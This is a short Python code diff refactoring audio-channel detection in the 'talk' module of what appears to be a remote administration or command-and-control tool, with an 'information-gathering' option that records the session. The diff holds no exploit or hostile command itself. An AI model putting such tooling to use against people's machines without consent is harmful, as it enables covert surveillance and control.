@@ -18,10 +18,6 @@ from domestic.global_state import *
 @internal_server_error_exception_handling
 def talk_action():
   try:
-    CHUNK = 81920
-    FORMAT = pyaudio.paInt16
-    RATE = 44100
-    channels = 2
     headersize = state['settings']['headersize']
     encryption = state['settings']['encryption']
     encoding = state['settings']['encoding']
@@ -30,11 +26,12 @@ def talk_action():
     frames = []
 
     p = pyaudio.PyAudio()
-    try:
-      stream = p.open(format=FORMAT, channels=channels, rate=RATE, input=True, output=False, frames_per_buffer=CHUNK)
-    except:
-      channels = 1
-      stream = p.open(format=FORMAT, channels=channels, rate=RATE, input=True, output=False, frames_per_buffer=CHUNK)
+    CHUNK = 81920
+    FORMAT = pyaudio.paInt16
+    RATE = 44100
+    CHANNELS = p.get_default_input_device_info()['maxInputChannels']
+
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, output=False, frames_per_buffer=CHUNK)
     record = state['options']['information-gathering']['record']['talk']
 
     client, addr = state['sockets']['modules']['talk'][0].accept()
@@ -71,7 +68,7 @@ def talk_action():
     write_error(err)
     try:
       if record:
-        make_wave(['modules', 'modules/talk'], client_obj[1], (channels, p, FORMAT, RATE, frames))
+        make_wave(['modules', 'modules/talk'], client_obj[1], (CHANNELS, p, FORMAT, RATE, frames))
 
       stream.stop_stream()
       stream.close()
